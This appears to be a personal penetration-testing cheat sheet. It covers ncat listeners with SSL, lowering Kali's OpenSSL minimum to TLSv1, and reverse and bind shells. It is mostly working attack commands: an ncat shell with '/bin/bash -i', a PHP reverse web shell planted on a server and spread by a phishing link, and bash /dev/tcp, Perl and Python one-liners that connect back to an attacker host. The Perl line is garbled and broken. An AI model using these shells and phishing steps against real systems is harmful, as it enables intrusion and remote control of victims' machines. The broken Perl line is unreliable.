ncat has encryption, nc does not.
This will start WITHOUT encryption
```
ncat -lvvp 4444
```

This will start WITH encryption
```
ncat -lvvp 4444 --ssl
```

ncat also needs to be running on the remote host, NOT nc, as nc does not do encryption and ncat does. It's like using HTTP vs HTTPS
#### Ensure ncat also runs on remote box
```
scp /usr/share/windows-binaries/ncat.exe <username>@<ipAddress>:"C:\Users\<username>\Desktop"
```
#### Start ncat (Kali):
```
ncat -lvvp 4444 --ssl
```

#### Windows
```
ncat.exe -v <kaliIP> <port> --ssl
```

If this failes, have a look at the procol being used for SSL (Linux ncat is more updated than Windows)

To Check the min protocol version that Kali uses:

On Kali:
```
cat /etc/ssl/openssl.cnf | grep MinProtocol
```

Example Output:
```
MinProtocol = TLSv1.2
```

Change it
```
vi /etc/ssl/openssl.cnf 
```

Go to the end of the file
Change the version to version 1
```
MinProtocol = TLSv1
```

Now restart the ncat listener:
```
ncat -lvvp 4444 --ssl
```

Now run again on the remote box:
```
ncat.exe -v <kaliIP> <port> --ssl
```

Open shell (On Kali):
```
ncat -lvvp 4444 -e '/bin/bash -i' --ssl
```

remote PC:
```
ncat -v <KaliIP> <port> --ssl
```


# WEB SHELLS:

Reverse shell.

1.) upload php reverse shell to web server
2.) Start listener on C2C server
3.) If user click on link, reverse shell will open.

# Install WebShells:
```
sudo apt install webshells
```

#### List:
```
ls /usr/share/webshells
```

Output:
```
asp  aspx  cfm  jsp  perl  php
```

Copy PHP webshell to root shell on local server to test:
```
cp /usr/share/webshells/php/php-reverse-shell.php /var/www/html/rvs.php
```

Modify the listening ports:
You can send the link to your target to click on (e.g.: phishing mail)
```
vi /var/www/html/rvs.php
```

Change:
```
$ip = <ServerIPthatListensForConnection> # e.g.: you kali box
$port = <portToListen>
```

Start listenr
```
nc -nlvp 1234
```

Once user click on link, reverse shell of the server will open.

# BASH Reverse shell
## Reverse using bash commands:
```
bash -i >& /dev/tcp/<kaliIP>/<listnerPort> 0>&1
```


# PERL REVERSE SHELL
#### Listen from the remote host
```
nc.exe -nlvp 1234
```

```
perl -e 'use Socket; $i="<kaliIP>"; $p=<listnerPort>; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp") ); if(connect(S, sockaddr_in($p, inet_aton($i)))) {open(STDIN. ">&S") : open (STDOUT, ">&S" ) : open (STDERR, ">&S" ) : exec ("/bin/sh -i" ) : ]: '
```


# PYTHON REVERSE SHELL:
# Listen from the remote host
```
nc.exe -nlvp 1234
```

```
python -c 'import socket, subprocess, os; s=socket. socket (socket.AF_INET, socket. SOCK_STREAM);s.connect(("10.211.55.7",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]) ;'
```
